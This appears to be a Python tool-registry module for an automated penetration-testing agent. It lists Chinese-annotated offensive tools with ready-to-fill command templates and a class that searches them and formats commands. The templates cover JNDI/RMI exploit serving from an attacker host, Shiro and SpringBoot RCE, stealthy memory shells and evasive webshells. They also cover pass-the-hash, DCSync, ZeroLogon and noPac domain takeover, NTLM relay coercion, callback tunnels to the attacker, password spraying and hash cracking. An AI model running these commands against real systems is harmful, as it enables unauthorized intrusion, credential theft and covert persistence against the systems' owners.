            {"desc": "启动RMI服务", "cmd": f"java -cp {TOOLS_DIR}/java_exploit/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer 'http://{{attacker_ip}}:{{http_port}}/#ExploitClass' {{rmi_port}}"},
        ],
    ),
    ExternalTool(
        id="shiro_tool",
        name="shiro_tool",
        description="Apache Shiro漏洞综合利用，密钥爆破+反序列化RCE+回显",
        category="java",
        keywords=["shiro", "rememberme", "反序列化", "密钥", "aes", "cb链"],
        binary=f"{TOOLS_DIR}/java_exploit/shiro_tool.jar",
        install_cmd="",
        install_type="jar",
        priority=1,
        project_url="",
        when_to_use="发现Shiro框架(Set-Cookie含rememberMe)时：爆破AES密钥→反序列化RCE",
        usage_templates=[
            {"desc": "Shiro利用(GUI)", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/shiro_tool.jar"},
        ],
        notes="目标特征: Cookie中含rememberMe=deleteMe。先爆破Key再利用CB链/CC链RCE",
    ),
    ExternalTool(
        id="java_chains",
        name="java-chains",
        description="Java利用链合集，集成多种反序列化/JNDI/内存马/回显Gadget",
        category="java",
        keywords=["java", "利用链", "反序列化", "gadget", "内存马", "回显"],
        binary=f"{TOOLS_DIR}/java_exploit/java-chains-1.4.0.jar",
        install_cmd="",
        install_type="jar",
        priority=1,
        project_url="https://github.com/vulhub/java-chains",
        when_to_use="Java反序列化利用的瑞士军刀；需要内存马注入/命令回显/特殊Gadget时使用",
        usage_templates=[
            {"desc": "交互式使用", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/java-chains-1.4.0.jar"},
        ],
        notes="180MB的超级Java利用工具，包含大量gadget和内存马payload",
    ),
    ExternalTool(
        id="jmg",
        name="jmg (Java内存马)",
        description="Java内存马注入工具，一键生成Filter/Servlet/Listener/Agent型内存马",
        category="java",
        keywords=["内存马", "memshell", "java", "filter", "servlet", "agent", "webshell"],
        binary=f"{TOOLS_DIR}/java_exploit/jmg-all-1.0.9_250101.jar",
        install_cmd="",
        install_type="jar",
        priority=2,
        project_url="https://github.com/pen4uin/java-memshell-generator",
        when_to_use="获取Java RCE后注入内存马维持访问；不落地文件更隐蔽",
        usage_templates=[
            {"desc": "生成内存马", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/jmg-all-1.0.9_250101.jar"},
        ],
    ),
    ExternalTool(
        id="springboot_exploit",
        name="SpringBootExploit",
        description="SpringBoot漏洞综合利用，Actuator/SpEL/H2 Console/Jolokia等RCE链",
        category="java",
        keywords=["springboot", "actuator", "spel", "h2", "jolokia", "rce", "spring"],
        binary=f"{TOOLS_DIR}/java_exploit/SpringBootExploit-1.3-SNAPSHOT-all.jar",
        install_cmd="",
        install_type="jar",
        priority=1,
        project_url="https://github.com/LandGrey/SpringBootVulExploit",
        when_to_use="发现SpringBoot应用且Actuator暴露时，利用各种RCE链(SpEL/H2/Jolokia)获取权限",
        usage_templates=[
            {"desc": "SpringBoot利用", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/SpringBootExploit-1.3-SNAPSHOT-all.jar"},
        ],
        notes="先用SBSCAN/SpringBoot-Scan确认暴露端点，再用此工具利用",
    ),
    ExternalTool(
        id="thinkphp_jar",
        name="ThinkPHP利用工具",
        description="ThinkPHP框架漏洞综合利用工具(jar)，覆盖2.x-6.x多个RCE",
        category="java",
        keywords=["thinkphp", "tp", "rce", "php框架"],
        binary=f"{TOOLS_DIR}/java_exploit/ThinkPHP.jar",
        install_cmd="",
        install_type="jar",
        priority=1,
        when_to_use="识别到ThinkPHP框架时使用，自动检测版本并利用对应RCE",
        usage_templates=[
            {"desc": "ThinkPHP利用", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/ThinkPHP.jar"},
        ],
    ),
    ExternalTool(
        id="tongda_tools",
        name="TongdaTools",
        description="通达OA漏洞利用工具，集成多个通达OA RCE/文件上传/SQL注入",
        category="java",
        keywords=["通达", "tongda", "oa", "办公系统", "国产"],
        binary=f"{TOOLS_DIR}/java_exploit/TongdaTools.jar",
        install_cmd="",
        install_type="jar",
        priority=1,
        when_to_use="目标是通达OA时立即使用，涵盖文件上传/RCE/SQL注入等漏洞",
        usage_templates=[
            {"desc": "通达OA利用", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/TongdaTools.jar"},
        ],
    ),
    ExternalTool(
        id="webshell_generate",
        name="Webshell_Generate",
        description="Webshell生成器，自动生成各类免杀Webshell(PHP/JSP/ASP)",
        category="java",
        keywords=["webshell", "免杀", "生成", "木马", "后门"],
        binary=f"{TOOLS_DIR}/java_exploit/Webshell_Generate-1.2.4.jar",
        install_cmd="",
        install_type="jar",
        priority=3,
        when_to_use="需要上传Webshell但被WAF拦截时，生成免杀Webshell绕过检测",
        usage_templates=[
            {"desc": "生成Webshell", "cmd": f"java -jar {TOOLS_DIR}/java_exploit/Webshell_Generate-1.2.4.jar"},
        ],
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  内网渗透 (intranet)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="impacket",
        name="impacket",
        description="Windows AD攻击工具集，含psexec/smbexec/wmiexec/secretsdump/GetNPUsers等",
        category="intranet",
        keywords=["ad", "域", "windows", "impacket", "psexec", "smb", "ntlm", "hash传递", "pth"],
        binary="impacket-psexec",
        install_cmd="pip install impacket",
        install_type="pip",
        priority=1,
        project_url="https://github.com/fortra/impacket",
        when_to_use="Windows域渗透必备：PTH/PTT/DCSync/AS-REP Roast/Kerberoast/横向移动",
        usage_templates=[
            {"desc": "PTH远程执行", "cmd": "impacket-psexec -hashes :{ntlm_hash} {domain}/{user}@{target}"},
            {"desc": "WMI远程执行", "cmd": "impacket-wmiexec -hashes :{ntlm_hash} {domain}/{user}@{target}"},
            {"desc": "DCSync导出hash", "cmd": "impacket-secretsdump {domain}/{user}:{password}@{dc_ip}"},
            {"desc": "AS-REP Roast", "cmd": "impacket-GetNPUsers {domain}/ -usersfile {user_list} -dc-ip {dc_ip} -format hashcat"},
            {"desc": "Kerberoast", "cmd": "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request"},
            {"desc": "SMB枚举共享", "cmd": "impacket-smbclient -hashes :{ntlm_hash} {domain}/{user}@{target}"},
        ],
        notes="域渗透核心工具。PTH不需要明文密码只要NTLM hash",
    ),
    ExternalTool(
        id="kerbrute",
        name="kerbrute",
        description="Kerberos预认证爆破，枚举有效域用户名和密码",
        category="intranet",
        keywords=["kerberos", "域", "用户名枚举", "密码爆破", "ad", "kerbrute"],
        binary=f"{TOOLS_DIR}/intranet/kerbrute_linux_amd64",
        install_cmd="",
        install_type="binary",
        priority=2,
        project_url="https://github.com/ropnop/kerbrute",
        when_to_use="域环境中枚举有效用户名或爆破域密码，比LDAP枚举更隐蔽",
        usage_templates=[
            {"desc": "用户名枚举", "cmd": f"{TOOLS_DIR}/intranet/kerbrute_linux_amd64 userenum -d {{domain}} --dc {{dc_ip}} {{user_list}}"},
            {"desc": "密码爆破", "cmd": f"{TOOLS_DIR}/intranet/kerbrute_linux_amd64 bruteuser -d {{domain}} --dc {{dc_ip}} {{password_list}} {{username}}"},
            {"desc": "密码喷洒", "cmd": f"{TOOLS_DIR}/intranet/kerbrute_linux_amd64 passwordspray -d {{domain}} --dc {{dc_ip}} {{user_list}} '{{password}}'"},
        ],
    ),
    ExternalTool(
        id="zerologon",
        name="CVE-2020-1472 (ZeroLogon)",
        description="域控提权漏洞，将域控密码置空获取域管权限",
        category="intranet",
        keywords=["zerologon", "域控", "cve-2020-1472", "提权", "dc", "netlogon"],
        binary=f"{TOOLS_DIR}/intranet/CVE-2020-1472/cve-2020-1472-exploit.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/dirkjanm/CVE-2020-1472",
        when_to_use="拿到域控IP后尝试ZeroLogon提权，成功后可DCSync导出所有hash",
        usage_templates=[
            {"desc": "ZeroLogon攻击", "cmd": f"python3 {TOOLS_DIR}/intranet/CVE-2020-1472/cve-2020-1472-exploit.py {{dc_name}} {{dc_ip}}"},
        ],
        notes="攻击会将DC密码置空，务必在成功后恢复。先测试再利用",
    ),
    ExternalTool(
        id="nopac",
        name="noPac (CVE-2021-42278/42287)",
        description="AD域提权，通过MAQ+S4U2self获取域管权限",
        category="intranet",
        keywords=["nopac", "域提权", "samaccountname", "ad", "cve-2021-42278"],
        binary=f"{TOOLS_DIR}/intranet/noPac/noPac.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/Ridter/noPac",
        when_to_use="有域普通用户凭据时尝试noPac提权到域管",
        usage_templates=[
            {"desc": "扫描检测", "cmd": f"python3 {TOOLS_DIR}/intranet/noPac/scanner.py {{domain}}/{{user}}:{{password}} -dc-ip {{dc_ip}}"},
            {"desc": "利用提权", "cmd": f"python3 {TOOLS_DIR}/intranet/noPac/noPac.py {{domain}}/{{user}}:{{password}} -dc-ip {{dc_ip}} -shell"},
        ],
    ),
    ExternalTool(
        id="petitpotam",
        name="PetitPotam",
        description="NTLM Relay攻击触发器，强制目标机器向攻击者发起NTLM认证",
        category="intranet",
        keywords=["ntlm", "relay", "petitpotam", "强制认证", "efs"],
        binary=f"{TOOLS_DIR}/intranet/PetitPotam/PetitPotam.py",
        install_cmd="",
        install_type="git",
        priority=2,
        project_url="https://github.com/topotam/PetitPotam",
        when_to_use="配合ntlmrelayx做NTLM Relay攻击，强制DC向攻击机发起认证",
        usage_templates=[
            {"desc": "触发NTLM认证", "cmd": f"python3 {TOOLS_DIR}/intranet/PetitPotam/PetitPotam.py {{listener_ip}} {{target_ip}}"},
        ],
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  隧道 / 代理 / 穿透 (tunnel)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="chisel",
        name="chisel",
        description="TCP隧道/SOCKS代理，用于内网穿透，单二进制无依赖",
        category="tunnel",
        keywords=["隧道", "代理", "内网", "穿透", "socks", "chisel", "pivot"],
        binary="chisel",
        install_cmd="go install github.com/jpillora/chisel@latest",
        install_type="go",
        priority=1,
        project_url="https://github.com/jpillora/chisel",
        when_to_use="需要从外网访问内网服务时；建立SOCKS代理或端口转发",
        usage_templates=[
            {"desc": "服务端(攻击机)", "cmd": "chisel server -p 8000 --reverse"},
            {"desc": "客户端SOCKS代理", "cmd": "chisel client {attacker_ip}:8000 R:socks"},
            {"desc": "端口转发", "cmd": "chisel client {attacker_ip}:8000 R:{local_port}:{internal_ip}:{internal_port}"},
        ],
    ),
    ExternalTool(
        id="stowaway",
        name="Stowaway",
        description="多级代理工具，支持多节点级联，适合复杂内网环境穿透",
        category="tunnel",
        keywords=["代理", "多级", "穿透", "内网", "级联", "stowaway"],
        binary=f"{TOOLS_DIR}/tunnel/stowaway_admin",
        install_cmd="",
        install_type="binary",
        priority=1,
        project_url="https://github.com/ph4ntonn/Stowaway",
        when_to_use="多层内网环境需要级联代理时使用；支持socks5代理和端口转发",
        usage_templates=[
            {"desc": "管理端(攻击机)", "cmd": f"{TOOLS_DIR}/tunnel/stowaway_admin -l {{listen_port}} -s {{secret}}"},
            {"desc": "代理端(目标机)", "cmd": f"{TOOLS_DIR}/tunnel/stowaway_agent -c {{attacker_ip}}:{{listen_port}} -s {{secret}}"},
        ],
        notes="admin端运行在攻击机，agent端上传到目标机运行。secret是连接密码",
    ),
    ExternalTool(
        id="neo_regeorg",
        name="Neo-reGeorg",
        description="HTTP隧道代理，通过Web服务器建立SOCKS5代理，穿过防火墙",
        category="tunnel",
        keywords=["http隧道", "regeorg", "socks", "代理", "web隧道", "防火墙"],
        binary=f"{TOOLS_DIR}/tunnel/Neo-reGeorg/neoreg.py",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/L-codes/Neo-reGeorg",
        when_to_use="只有HTTP出网时通过上传tunnel脚本建立SOCKS代理；适合严格防火墙环境",
        usage_templates=[
            {"desc": "生成tunnel脚本", "cmd": f"python3 {TOOLS_DIR}/tunnel/Neo-reGeorg/neoreg.py generate -k {{password}}"},
            {"desc": "连接tunnel", "cmd": f"python3 {TOOLS_DIR}/tunnel/Neo-reGeorg/neoreg.py -k {{password}} -u {{target}}/tunnel.php"},
        ],
        notes="先generate生成对应语言的tunnel文件(PHP/JSP/ASPX)，上传到目标Web目录，再连接建立代理",
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  提权 (privesc)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="linpeas",
        name="linpeas",
        description="Linux提权信息收集脚本，自动检测SUID/sudo/cron/内核漏洞等提权路径",
        category="privesc",
        keywords=["提权", "linux", "suid", "sudo", "内核", "linpeas", "权限提升"],
        binary=f"{TOOLS_DIR}/privesc/linpeas_small.sh",
        install_cmd="",
        install_type="binary",
        priority=1,
        project_url="https://github.com/carlospolop/PEASS-ng",
        when_to_use="获取低权限shell后上传运行，自动发现提权路径：SUID/sudo/定时任务/内核漏洞等",
        usage_templates=[
            {"desc": "完整扫描", "cmd": f"bash {TOOLS_DIR}/privesc/linpeas_small.sh"},
            {"desc": "快速扫描", "cmd": f"bash {TOOLS_DIR}/privesc/linpeas_small.sh -a"},
        ],
        notes="输出中红色/黄色高亮的项目优先关注。关注SUID二进制/可写cron/sudo规则/内核版本",
    ),

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  辅助工具 / 字典 (util)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ExternalTool(
        id="hashcat",
        name="hashcat",
        description="GPU加速密码破解，支持500+哈希类型",
        category="util",
        keywords=["hash", "密码破解", "hashcat", "md5", "sha1", "bcrypt", "crack"],
        binary="hashcat",
        install_cmd="apt install -y hashcat",
        install_type="apt",
        priority=2,
        project_url="https://github.com/hashcat/hashcat",
        when_to_use="需要破解hash且在线查表无果时使用；支持GPU加速大字典爆破",
        usage_templates=[
            {"desc": "MD5爆破", "cmd": f"hashcat -m 0 {{hash_file}} {TOOLS_DIR}/intranet/rockyou.txt"},
            {"desc": "SHA256爆破", "cmd": f"hashcat -m 1400 {{hash_file}} {TOOLS_DIR}/intranet/rockyou.txt"},
            {"desc": "bcrypt爆破", "cmd": f"hashcat -m 3200 {{hash_file}} {TOOLS_DIR}/intranet/rockyou.txt"},
            {"desc": "NTLM爆破", "cmd": f"hashcat -m 1000 {{hash_file}} {TOOLS_DIR}/intranet/rockyou.txt"},
        ],
    ),
    ExternalTool(
        id="john",
        name="John the Ripper",
        description="经典密码破解工具，支持多种格式和智能规则",
        category="util",
        keywords=["hash", "密码", "john", "crack", "破解"],
        binary="john",
        install_cmd="apt install -y john",
        install_type="apt",
        priority=3,
        project_url="https://github.com/openwall/john",
        when_to_use="hashcat不支持的格式用john；或需要智能规则生成密码变体时",
        usage_templates=[
            {"desc": "自动检测破解", "cmd": f"john {{hash_file}} --wordlist={TOOLS_DIR}/intranet/rockyou.txt"},
            {"desc": "指定格式", "cmd": f"john --format=raw-md5 {{hash_file}} --wordlist={TOOLS_DIR}/intranet/rockyou.txt"},
        ],
    ),
    ExternalTool(
        id="seclists",
        name="SecLists",
        description="安全测试字典集合：目录/用户名/密码/Fuzzing Payload等",
        category="util",
        keywords=["字典", "wordlist", "seclists", "密码", "目录", "fuzz"],
        binary=f"{TOOLS_DIR}/SecLists",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/danielmiessler/SecLists",
        when_to_use="ffuf/hydra/hashcat等工具需要字典时引用SecLists中对应分类",
        usage_templates=[
            {"desc": "目录字典", "cmd": f"ls {TOOLS_DIR}/SecLists/Discovery/Web-Content/"},
            {"desc": "密码字典", "cmd": f"ls {TOOLS_DIR}/SecLists/Passwords/Common-Credentials/"},
            {"desc": "用户名字典", "cmd": f"ls {TOOLS_DIR}/SecLists/Usernames/"},
            {"desc": "Fuzzing字典", "cmd": f"ls {TOOLS_DIR}/SecLists/Fuzzing/"},
        ],
        notes=f"常用: {TOOLS_DIR}/SecLists/Discovery/Web-Content/common.txt, Passwords/Common-Credentials/10k-most-common.txt",
    ),
    ExternalTool(
        id="payloadsallthethings",
        name="PayloadsAllTheThings",
        description="Web安全Payload百科全书，覆盖SSTI/SQLi/XSS/XXE/SSRF等所有漏洞类型",
        category="util",
        keywords=["payload", "字典", "技巧", "bypass", "绕过", "payloadsallthethings"],
        binary=f"{TOOLS_DIR}/PayloadsAllTheThings",
        install_cmd="",
        install_type="git",
        priority=1,
        project_url="https://github.com/swisskyrepo/PayloadsAllTheThings",
        when_to_use="构造payload时参考；查找WAF绕过技巧；查看各漏洞类型的完整payload列表",
        usage_templates=[
            {"desc": "查看SSTI", "cmd": f"cat '{TOOLS_DIR}/PayloadsAllTheThings/Server Side Template Injection/README.md' | head -100"},
            {"desc": "查看SQLi", "cmd": f"cat '{TOOLS_DIR}/PayloadsAllTheThings/SQL Injection/README.md' | head -100"},
            {"desc": "查看SSRF", "cmd": f"cat '{TOOLS_DIR}/PayloadsAllTheThings/Server Side Request Forgery/README.md' | head -100"},
            {"desc": "查看XXE", "cmd": f"cat '{TOOLS_DIR}/PayloadsAllTheThings/XXE Injection/README.md' | head -100"},
        ],
        notes="每种漏洞一个目录，README.md包含完整Payload列表和绕过技巧",
    ),
]


# ═══════════════════════════════════════════════════════════════
# ToolRegistry 类
# ═══════════════════════════════════════════════════════════════

class ToolRegistry:
    """外部工具注册表，支持查询、检测安装状态、生成使用命令。"""

    def __init__(self) -> None:
        self._tools = {t.id: t for t in TOOLS}

    def check_installed(self, tool_id: str) -> bool:
        """检查工具是否已安装。"""
        tool = self._tools.get(tool_id)
        if not tool:
            return False
        binary = tool.binary
        if binary.startswith("/") or binary.startswith(os.path.expanduser("~")):
            return os.path.exists(binary)
        if tool.install_type in ("jar",):
            return os.path.exists(binary)
        return shutil.which(binary) is not None

    def get_all_installed(self) -> list[str]:
        return [tid for tid in self._tools if self.check_installed(tid)]

    def get_all_missing(self) -> list[str]:
        return [tid for tid in self._tools if not self.check_installed(tid)]

    def search(self, query: str, max_results: int = 5) -> list[ExternalTool]:
        """根据关键词搜索匹配的工具。"""
        ql = query.lower()
        scored: list[tuple[int, ExternalTool]] = []
        for tool in TOOLS:
            score = 0
            if ql in tool.id or ql in tool.name.lower():
                score += 10
            for kw in tool.keywords:
                if kw in ql or ql in kw:
                    score += 3
            if any(term in tool.description for term in ql.split()):
                score += 1
            if score > 0:
                score += (10 - tool.priority)
                scored.append((score, tool))
        scored.sort(key=lambda x: x[0], reverse=True)
        return [t for _, t in scored[:max_results]]

    def get_tool(self, tool_id: str) -> ExternalTool | None:
        return self._tools.get(tool_id)

    def get_status_report(self) -> str:
        """生成工具安装状态报告。"""
        lines = ["=== 外部安全工具状态 ===\n"]
        categories: dict[str, list[ExternalTool]] = {}
        for t in TOOLS:
            categories.setdefault(t.category, []).append(t)

        cat_names = {
            "scanner": "漏洞扫描",
            "recon": "侦察/信息收集",
            "exploit": "Web漏洞利用",
            "fuzzer": "Fuzzing/目录发现",
            "java": "Java漏洞利用",
            "intranet": "内网渗透",
            "tunnel": "隧道/代理",
            "privesc": "提权",
            "util": "辅助工具/字典",
        }

        installed_count = 0
        total = len(TOOLS)

        for cat in ["scanner", "recon", "fuzzer", "exploit", "java", "intranet", "tunnel", "privesc", "util"]:
            tools = categories.get(cat, [])
            if not tools:
                continue
            lines.append(f"── {cat_names.get(cat, cat)} ──")
            for t in sorted(tools, key=lambda x: x.priority):
                is_installed = self.check_installed(t.id)
                if is_installed:
                    installed_count += 1
                status = "✅" if is_installed else "❌"
                lines.append(f"  {status} {t.name:25s} {t.description[:55]}")
            lines.append("")

        lines.insert(1, f"已安装: {installed_count}/{total}\n")
        return "\n".join(lines)

    def format_usage(self, tool_id: str, **kwargs: str) -> str:
        """格式化工具使用命令。"""
        tool = self._tools.get(tool_id)
        if not tool:
            return f"未知工具: {tool_id}"
        lines = [f"=== {tool.name} ===", f"{tool.description}", ""]
        if tool.when_to_use:
            lines.append(f"何时使用: {tool.when_to_use}")
            lines.append("")
        if tool.notes:
            lines.append(f"提示: {tool.notes}")
            lines.append("")
        for tpl in tool.usage_templates:
            cmd = tpl["cmd"]
            for k, v in kwargs.items():
                cmd = cmd.replace(f"{{{k}}}", v)
            lines.append(f"  [{tpl['desc']}]")
            lines.append(f"    {cmd}")
            lines.append("")
        if not self.check_installed(tool_id):
            lines.append(f"⚠️ 未安装! 安装: {tool.install_cmd}")
        return "\n".join(lines)

    def list_all(self) -> str:
        lines = [f"=== 已注册外部安全工具 ({len(TOOLS)} 个) ==="]
        for t in TOOLS:
            lines.append(f"  {t.id:22s} [{t.category:9s}] {t.name} - {t.description[:55]}")
        return "\n".join(lines)
